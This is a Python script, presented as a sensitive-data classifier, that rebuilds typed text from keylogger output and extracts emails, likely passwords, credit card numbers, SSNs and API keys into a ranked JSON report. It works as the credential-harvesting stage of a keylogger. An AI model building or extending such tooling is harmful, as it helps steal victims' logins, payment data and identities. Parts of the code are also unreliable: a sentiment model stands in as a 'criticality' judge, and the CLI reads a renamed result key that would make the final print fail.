#!/usr/bin/env python3
"""
classifier.py - Enhanced email/password classifier with LLM support
Combines regex patterns with AI to detect sensitive data and assess criticality.
Uses observer pattern to notify when critical data is found.
"""

import json
import os
import re
from collections import Counter
from abc import ABC, abstractmethod
from typing import List, Dict, Any
from datetime import datetime

# Regex patterns for finding sensitive data
EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
CREDIT_CARD_RE = re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b')
SSN_RE = re.compile(r'\b\d{3}-\d{2}-\d{4}\b')
API_KEY_RE = re.compile(r'(?i)(api[_-]?key|token|secret|auth|key|api)\s*[:=]\s*["\']?([a-zA-Z0-9_\-!@#$%^&*()+={}\[\]|\\:;"\'<>?,./~`]{12,})["\']?')
# Password patterns - looks for labeled passwords
LABELED_PATTERNS = [
    re.compile(r"(?i)(?:password|passwd|pass|pwd|pw)\s*[:=]\s*['\"]?([^'\"\s,;]+)['\"]?"),
    re.compile(r"(?i)(?:password|passwd|pass|pwd|pw)\s*(?:is|=|->)\s*['\"]?([^'\"\s,;]+)['\"]?"),
]

# Pattern for quoted strings that might be passwords
QUOTED_STR_RE = re.compile(r"['\"]([^'\"]{6,})['\"]")

# Pattern for tokens that look like passwords (8+ chars, has letter and number)
UNLABELED_TOKEN_RE = re.compile(r"""\b(?=\S{8,})(?=.*[A-Za-z])(?=.*[0-9@#$%^&*()_+\-={}\[\]|\\:;\"'<>.,?/])(\S+)\b""")


# ============================================================================
# OBSERVER PATTERN - Notifies when critical data is found
# ============================================================================

class Observer(ABC):
    """Base class for observers - they get notified about events"""
    @abstractmethod
    def update(self, event_type: str, data: Dict[str, Any]):
        """Called when something important happens"""
        pass


class FileObserver(Observer):
    """Saves alerts directly into the JSON output file"""
    def __init__(self, json_filepath: str):
        self.json_filepath = json_filepath
        self.alert_data = None

    def update(self, event_type: str, data: Dict[str, Any]):
        """Store alert data to be added to JSON"""
        self.alert_data = {
            "alert_triggered": True,
            "alert_timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "alert_type": event_type,
        }

    def get_alert_data(self):
        """Retrieve the stored alert data"""
        return self.alert_data


class Subject:
    """The thing being observed - manages and notifies observers"""
    def __init__(self):
        self._observers: List[Observer] = []

    def attach(self, observer: Observer):
        """Add a new observer to the list"""
        if observer not in self._observers:
            self._observers.append(observer)

    def detach(self, observer: Observer):
        """Remove an observer from the list"""
        self._observers.remove(observer)

    def notify(self, event_type: str, data: Dict[str, Any]):
        """Tell all observers about an event"""
        for observer in self._observers:
            observer.update(event_type, data)


# ============================================================================
# HELPER FUNCTIONS - Extract data using regex
# ============================================================================

def looks_like_url_or_email(token):
    """Check if a token is actually a URL or email (not a password)"""
    if '@' in token and EMAIL_RE.search(token):
        return True
    if token.startswith('http') or '://' in token:
        return True
    if re.match(r'^[a-z0-9-]+\.(com|org|net|edu|gov|co|io|ai|dev)$', token.lower()):
        return True
    if 'youtube' in token.lower() or 'google' in token.lower() or 'facebook' in token.lower():
        return True
    return False


def is_noise_token(token):
    """Check if a token is just noise"""
    token = token.strip()
    if re.fullmatch(r"\d{4}-\d{2}-\d{2}", token):
        return True
    if re.fullmatch(r"\d{1,2}:\d{2}:\d{2}", token):
        return True
    if token.startswith('Key.') or token.startswith('Special:') or token.lower().startswith('key:'):
        return True
    if token.startswith('[') and token.endswith(']'):
        return True
    keylog_noise = ['backspace', 'shift', 'ctrl', 'alt', 'enter', 'tab', 'esc', 'space']
    if token.lower() in keylog_noise:
        return True
    if len(token) <= 2:
        return True
    return False


def reconstruct_text_from_keylog(raw_log: str) -> str:
    lines = [line.strip() for line in raw_log.splitlines() if line.strip()]
    buffer = []
    i = 0
    caps_lock = False  # Track caps lock state

    while i < len(lines):
        line = lines[i]

        # Window change → add space as natural break
        if line.startswith('--- Window:'):
            if buffer and buffer[-1] not in (' ', '\n'):
                buffer.append(' ')
            i += 1
            continue

        # Backspace
        if '[backspace]' in line.lower():
            if buffer:
                buffer.pop()
            i += 1
            continue

        # Caps Lock toggle
        if 'caps_lock' in line.lower():
            caps_lock = not caps_lock
            i += 1
            continue

        # Shift (check current or previous line)
        is_shift = '[shift]' in line.lower()
        if is_shift:
            i += 1
            continue

        if i > 0 and '[shift]' in lines[i-1].lower():
            is_shift = True

        # Skip other modifiers
        if re.search(r'\[(ctrl|alt|cmd|num_lock|scroll_lock|f\d{1,2})\]', line, re.I):
            i += 1
            continue

        # Extract character
        captured = None
        m = re.search(r'Key:\s+(.)$', line)
        if m:
            captured = m.group(1)

        if captured:
            # Apply shift or caps lock
            apply_upper = is_shift or (caps_lock and captured.isalpha())

            if apply_upper:
                if captured.isalpha():
                    captured = captured.upper()
                else:
                    # Shift symbols
                    shift_map = {
                        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
                        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~'
                    }
                    captured = shift_map.get(captured, captured.upper())

            buffer.append(captured)
            i += 1
            continue

        # Special keys
        if 'space' in line.lower():
            buffer.append(' ')
        elif 'enter' in line.lower():
            buffer.append('\n')

        i += 1

    # Final cleanup
    text = ''.join(buffer).strip()
    text = re.sub(r'\s{2,}', ' ', text)          # collapse extra spaces
    text = re.sub(r'([a-zA-Z0-9])\s+([@#$%^&*()_+\-={}\[\]|\\:;"\'<>?,./!~`])', r'\1\2', text)  # remove spaces before symbols
    text = re.sub(r'([@#$%^&*()_+\-={}\[\]|\\:;"\'<>?,./!~`])\s+([a-zA-Z0-9])', r'\1\2', text)  # after symbols

    # Debug
    print("\n" + "=" * 70)
    print("RECONSTRUCTED TEXT (first 400 chars):")
    print(text[:400])
    print("Length:", len(text))
    print("Contains 'password:' ?", 'password:' in text.lower())
    print("Contains 'PASSWORD:' ?", 'PASSWORD:' in text)
    print("Contains '#'", '#' in text)
    print("Contains '$'", '$' in text)
    print("=" * 70 + "\n")

    return text


def extract_emails(text):
    emails = []
    emails.extend(EMAIL_RE.findall(text))
    reconstructed = reconstruct_text_from_keylog(text)
    if reconstructed:
        emails.extend(EMAIL_RE.findall(reconstructed))

    # Fix typo domains
    typo_pattern = re.compile(r'([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9-]+?)(com|org|net|edu|gov|io|co|ai)\b')
    for match in typo_pattern.finditer(reconstructed):
        username = match.group(1)
        domain_part = match.group(2)
        tld = match.group(3)
        if domain_part.lower() in ['gail', 'gmai', 'gmal']:
            domain_part = 'gmail'
        email = f"{username}@{domain_part}.{tld}"
        emails.append(email)

    cleaned = []
    for email in set(emails):
        if len(email) > 50 or email.count('@') > 1:
            continue
        email = re.sub(r'(\.com|\.org|\.net|\.edu|\.gov|\.io).*', r'\1', email)
        if EMAIL_RE.match(email):
            cleaned.append(email)

    return list(set(cleaned))


def extract_password_candidates(text):
    reconstructed = reconstruct_text_from_keylog(text)
    candidates = []

    # Labeled patterns (keep as-is — they're good)
    for pat in LABELED_PATTERNS:
        for m in pat.findall(reconstructed):
            token = m.strip()
            if not looks_like_url_or_email(token) and not is_noise_token(token):
                candidates.append(token)

    # Quoted strings (keep, but add min length + strength check)
    for m in QUOTED_STR_RE.findall(reconstructed):
        t = m.strip()
        if len(t) >= 8 and not looks_like_url_or_email(t) and not is_noise_token(t):
            # Add basic strength: at least 1 digit + 1 symbol or uppercase
            has_digit = any(c.isdigit() for c in t)
            has_upper = any(c.isupper() for c in t)
            has_symbol = any(c in '@#$%^&*()_+-=[]{}|;:,.<>?/!~`' for c in t)
            if has_digit and (has_upper or has_symbol):
                candidates.append(t)

    # Unlabeled strong tokens — make stricter
    for m in UNLABELED_TOKEN_RE.findall(reconstructed):
        token = m.strip()
        if len(token) >= 8 and not looks_like_url_or_email(token) and not is_noise_token(token):
            # Reject if it looks like a URL/domain or sentence fragment
            if '.' in token and len(token.split('.')) > 2:  # e.g. pinterest.fruthb.dz
                continue
            if len(token) > 30 and ' ' not in token:  # too long random string = noise
                continue
            # Require stronger mix
            has_digit = any(c.isdigit() for c in token)
            has_upper = any(c.isupper() for c in token)
            has_symbol = any(c in '@#$%^&*()_+-=[]{}|;:,.<>?/!~`' for c in token)
            if has_digit and (has_upper or has_symbol):
                candidates.append(token)

    return list(set(candidates))


def extract_sensitive_data(text: str) -> dict:
    """
    Extract credit cards, SSNs, and API keys/tokens/secrets from raw + reconstructed text.
    Improved to catch prefixed/variant SSNs and quoted API keys.
    """
    reconstructed = reconstruct_text_from_keylog(text)

    # Credit cards - keep original (solid pattern)
    credit_cards = list(set(
        CREDIT_CARD_RE.findall(text) +
        CREDIT_CARD_RE.findall(reconstructed)
    ))

    # SSNs - improved to handle prefixes like "myssn", "ssn", "my ssn" etc.
    # Also allows flexible separators (space/dash) and cleans to standard format
    ssn_candidates = []
    ssn_pattern = re.compile(r'(?i)(?:ssn|social|my\s*ssn|ssn\s*number)?\s*[:=]?\s*(\d{3}[- ]?\d{2}[- ]?\d{4})')
    for m in ssn_pattern.finditer(reconstructed + text):
        digits = re.sub(r'[^0-9]', '', m.group(1))  # remove dashes/spaces
        if len(digits) == 9 and digits.isdigit():
            formatted = f"{digits[:3]}-{digits[3:5]}-{digits[5:]}"
            ssn_candidates.append(formatted)

    # API keys/tokens/secrets - improved to catch after =/:, strip quotes, allow shorter but strong keys
    api_pattern = re.compile(r'(?i)(api[_-]?key|token|secret|auth|key|api)\s*[:=]\s*["\']?([a-zA-Z0-9_\-!@#$%^&*()+={}\[\]|\\:;"\'<>?,./~`]{12,})["\']?')
    api_candidates = []
    for m in api_pattern.finditer(reconstructed + text):
        key_value = m.group(2).strip('"\'')  # remove surrounding quotes
        if len(key_value) >= 12 and not looks_like_url_or_email(key_value):
            api_candidates.append(key_value)

    return {
        'credit_cards': credit_cards,
        'ssns': list(set(ssn_candidates)),          # dedup and use improved list
        'api_keys': list(set(api_candidates))       # dedup and cleaned
    }


# ============================================================================
# LLM ANALYZER - Uses Hugging Face model for criticality
# ============================================================================

class CriticalityAnalyzer:
    """Uses Hugging Face model to determine if found data is critical"""
    def __init__(self, use_local_model=True):
        self.use_local_model = use_local_model
        self.model = None
        if use_local_model:
            self._init_local_model()

    def _init_local_model(self):
        try:
            from transformers import pipeline
            self.model = pipeline(
                "sentiment-analysis",
                model="distilbert-base-uncased-finetuned-sst-2-english",
                device=-1
            )
        except ImportError:
            self.model = None
        except Exception:
            self.model = None

    def analyze_criticality(self, text_sample: str, context: Dict[str, Any]) -> Dict[str, Any]:
        rule_score = self._rule_based_score(context)
        llm_score = 0.0
        llm_reasoning = "AI not available"

        if self.model:
            llm_result = self._llm_based_score(text_sample)
            llm_score = llm_result['score']
            llm_reasoning = llm_result['reasoning']

        final_score = (rule_score * 0.6) + (llm_score * 0.4)
        criticality_level = self._get_criticality_level(final_score)

        return {
            'criticality_level': criticality_level,
            'final_risk_score': final_score,  # was confidence_score
            'rules_danger': rule_score,
            'ai_suspicion': llm_score,
            'ai_reasoning': llm_reasoning,
            'is_critical': final_score >= 0.7
        }

    def _rule_based_score(self, context: Dict[str, Any]) -> float:
        score = 0.0
        if context.get('email_count', 0) > 0:
            score += min(0.2, context['email_count'] * 0.05)
        if context.get('password_count', 0) > 0:
            score += min(0.4, context['password_count'] * 0.1)
        if context.get('has_credit_cards', False):
            score += 0.3
        if context.get('has_ssns', False):
            score += 0.3
        if context.get('has_api_keys', False):
            score += 0.25
        return min(1.0, score)

    def _llm_based_score(self, text_sample: str) -> Dict[str, Any]:
        if not self.model:
            return {'score': 0.0, 'reasoning': 'Model not available'}
        try:
            if len(text_sample) > 500:
                text_sample = text_sample[:500] + "..."
            prompt = f"This text contains sensitive information: {text_sample}"
            result = self.model(prompt)[0]
            if result['label'] == 'NEGATIVE':
                score = result['score']
                reasoning = f"AI detected concerning content ({score:.2f} confidence)"
            else:
                score = 1.0 - result['score']
                reasoning = "AI detected normal content"
            return {'score': score, 'reasoning': reasoning}
        except Exception as e:
            return {'score': 0.0, 'reasoning': f'AI error: {str(e)}'}

    def _get_criticality_level(self, score: float) -> str:
        if score >= 0.8: return "CRITICAL"
        elif score >= 0.6: return "HIGH"
        elif score >= 0.4: return "MEDIUM"
        elif score >= 0.2: return "LOW"
        else: return "MINIMAL"


# ============================================================================
# MAIN CLASSIFIER
# ============================================================================

class EnhancedClassifier(Subject):
    """Main classifier that finds sensitive data and assesses criticality"""
    def __init__(self, use_llm=True):
        super().__init__()
        self.analyzer = CriticalityAnalyzer(use_local_model=use_llm) if use_llm else None

    def classify_text(self, text: str) -> Dict[str, Any]:
        emails = extract_emails(text)
        passwords = extract_password_candidates(text)
        sensitive = extract_sensitive_data(text)

        email_counts = Counter(emails)
        pw_counts = Counter(passwords)

        context = {
            'email_count': len(email_counts),
            'password_count': len(pw_counts),
            'has_credit_cards': len(sensitive['credit_cards']) > 0,
            'has_ssns': len(sensitive['ssns']) > 0,
            'has_api_keys': len(sensitive['api_keys']) > 0
        }

        criticality = None
        if self.analyzer:
            text_sample = text[:1000] if len(text) > 1000 else text
            criticality = self.analyzer.analyze_criticality(text_sample, context)

        if criticality and criticality['is_critical']:
            self.notify("CRITICAL_DATA_FOUND", {
                "criticality_level": criticality['criticality_level'],
                "confidence": criticality['final_risk_score'],  # ← changed to the new key name
                "email_count": len(email_counts),
                "password_count": len(pw_counts),
                "sensitive_data": sensitive
            })

        return {
            'emails': [{'value': v, 'count': c} for v, c in email_counts.most_common()],
            'passwords': [{'value': v, 'count': c} for v, c in pw_counts.most_common()],
            'sensitive_data': sensitive,
            'criticality_assessment': criticality
        }


# ============================================================================
# CLI INTERFACE (for standalone testing)
# ============================================================================

def main():
    import argparse
    import sys

    parser = argparse.ArgumentParser(description='Classify sensitive data in text files')
    parser.add_argument('input', help='Input file to analyze')
    parser.add_argument('--out', help='Output JSON file')
    parser.add_argument('--no-llm', action='store_true', help='Disable AI (faster)')
    args = parser.parse_args()

    if not os.path.isfile(args.input):
        print(f"Error: File not found: {args.input}")
        sys.exit(1)

    with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
        text = f.read()

    out_path = args.out or (args.input + '.classified.json')

    classifier = EnhancedClassifier(use_llm=not args.no_llm)
    file_observer = FileObserver(out_path)
    classifier.attach(file_observer)

    print(f"[*] Analyzing {args.input}...")
    result = classifier.classify_text(text)

    if file_observer.get_alert_data():
        result['alert'] = file_observer.get_alert_data()

    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

    print(f"[+] Results saved to: {out_path}")
    print(f"\nFound:")
    print(f" - {len(result['emails'])} emails")
    print(f" - {len(result['passwords'])} passwords")
    print(f" - {len(result['sensitive_data']['credit_cards'])} credit cards")

    if result['criticality_assessment']:
        crit = result['criticality_assessment']
        print(f"\nCriticality: {crit['criticality_level']} ({crit['confidence_score']:.0%})")


if __name__ == '__main__':
    main()